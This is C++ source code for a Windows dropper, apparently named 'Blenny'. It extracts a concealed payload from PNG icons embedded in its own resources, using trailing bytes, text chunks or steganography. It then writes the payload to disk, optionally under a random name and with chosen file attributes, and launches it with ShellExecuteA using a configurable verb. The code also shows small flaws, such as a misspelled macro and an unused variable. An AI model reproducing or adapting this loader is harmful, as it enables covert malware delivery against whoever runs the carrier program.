#include <windows.h>

#include <facade.hpp>

#include <cstddef>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

#include "config.hpp"

using namespace facade;

#pragma pack( push )
#pragma pack( 2 )
typedef struct
{
   BYTE   bWidth;               // Width, in pixels, of the image
   BYTE   bHeight;              // Height, in pixels, of the image
   BYTE   bColorCount;          // Number of colors in image (0 if >=8bpp)
   BYTE   bReserved;            // Reserved
   WORD   wPlanes;              // Color Planes
   WORD   wBitCount;            // Bits per pixel
   DWORD   dwBytesInRes;         // how many bytes in this resource?
   WORD   nID;                  // the ID
} GRPICONDIRENTRY, *LPGRPICONDIRENTRY;
#pragma pack( pop )

#pragma pack( push )
#pragma pack( 2 )
typedef struct 
{
   WORD            idReserved;   // Reserved (must be 0)
   WORD            idType;       // Resource type (1 for icons)
   WORD            idCount;      // How many images?
   GRPICONDIRENTRY   idEntries[1]; // The entries for each image
} GRPICONDIR, *LPGRPICONDIR;
#pragma pack( pop )

std::vector<std::uint8_t> get_resource(LPCSTR name, LPCSTR type) {
   auto res = FindResourceA(nullptr, name, type);

   if (res == nullptr)
      throw exception::Exception("FindResource failed");

   auto size = SizeofResource(nullptr, res);
   auto load = LoadResource(nullptr, res);

   if (load == nullptr)
      throw exception::Exception("LoadResource failed");

   auto ptr = reinterpret_cast<std::uint8_t *>(LockResource(load));

   return std::vector<std::uint8_t>(ptr, ptr+size);
}

void exec_png_payload(PNGPayload &payload) {
   std::vector<std::uint8_t> payload_data;

#if defined(BLENNY_TRAILING_PAYLOAD)
   payload_data = payload.get_trailing_data();
#elif defined(BLENNY_TEXT_PAYLOAD)
   payload_data = payload.extract_text_payloads(BLENNY_TEXT_PAYLOAD)[0];
#elif defined(BLENNY_ZTEXT_PAYLOAD)
   payload_data = payload.extract_ztext_payloads(BLENNY_ZTEXT_PAYLOAD)[0];
#elif defined(BLENNY_STEGO_PAYLOAD)
   payload.load();
   payload_data = payload.extract_stego_payload();
#else
   #error No payload type defined by build system.
#endif

   char payload_filename[MAX_PATH+1];
   std::memset(&payload_filename[0], 0, MAX_PATH+1);

   DWORD env_size = ExpandEnvironmentStringsA(BLENNY_PATH, payload_filename, MAX_PATH+1);

   if (env_size == 0)
      throw exception::Exception("ExpandEnvironmentStringsA failed");

   --env_size;
   payload_filename[env_size++] = '/';

#if defined(BLENNY_RANDOM_FILENAME)
   std::srand(std::time(nullptr));

   auto alpha = std::string("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
   std::size_t length;

#if defined(BLENNY_RANDOM_FILENAME_RANiDOM_LENGTH)
   length = rand() % 16 + 4;
#else
   length = BLENNY_RANDOM_FILENAME_LENGTH;
#endif

   std::string random_filename;

   for (std::size_t i=0; i<length; ++i)
      random_filename.push_back(alpha[rand() % alpha.size()]);

   std::memcpy(&payload_filename[env_size], random_filename.c_str(), random_filename.size());
   env_size += random_filename.size();
#else
   std::memcpy(&payload_filename[env_size], BLENNY_FILENAME, std::strlen(BLENNY_FILENAME));
   env_size += std::strlen(BLENNY_FILENAME);
#endif

   std::memcpy(&payload_filename[env_size], BLENNY_EXT, std::strlen(BLENNY_EXT));
   env_size += std::strlen(BLENNY_EXT);

   auto payload_handle = CreateFileA(payload_filename,
                                     GENERIC_WRITE,
                                     0,
                                     nullptr,
                                     CREATE_ALWAYS,
                                     BLENNY_FILE_ATTRIBUTES,
                                     nullptr);

   if (payload_handle == INVALID_HANDLE_VALUE)
      throw exception::Exception("CreateFileA failed");

   DWORD bytesWritten = 0;
   
   if (!WriteFile(payload_handle,
                  payload_data.data(),
                  payload_data.size(),
                  &bytesWritten,
                  nullptr))
      throw exception::Exception("WriteFile failed");

   CloseHandle(payload_handle);

#if !defined(BLENNY_PAYLOAD_ARGS)
   char *payload_args = nullptr;
#else
   char *payload_args = BLENNY_PAYLOAD_ARGS;
#endif

   if (reinterpret_cast<std::intptr_t>(ShellExecuteA(nullptr,
                                                     BLENNY_ADMIN,
                                                     payload_filename,
                                                     BLENNY_PAYLOAD_ARGS,
                                                     nullptr,
                                                     BLENNY_CMD_SHOW)) < 32)
      throw exception::Exception("ShellExecuteA failed");
}

int WINAPI WinMain(HINSTANCE instance, HINSTANCE prevInstance, LPSTR cmdLine, int showCmd)
{
   try {
      auto icon_dir = get_resource("MAINICON", RT_GROUP_ICON);
      auto icon_data = reinterpret_cast<GRPICONDIR *>(icon_dir.data());

      for (std::uint16_t i=0; i<icon_data->idCount; ++i)
      {
         auto entry = icon_data->idEntries[i];
         auto id = entry.nID;
         auto image_data = get_resource(MAKEINTRESOURCE(id), RT_ICON);

         if (std::memcmp(image_data.data(), png::Image::Signature, 8) != 0)
            continue;

         try {
            exec_png_payload(PNGPayload(image_data));
            return 0;
         }
         catch (std::exception &) { continue; }
      }
   }
   catch (std::exception &) {
      return 1;
   }

   return 0;
}
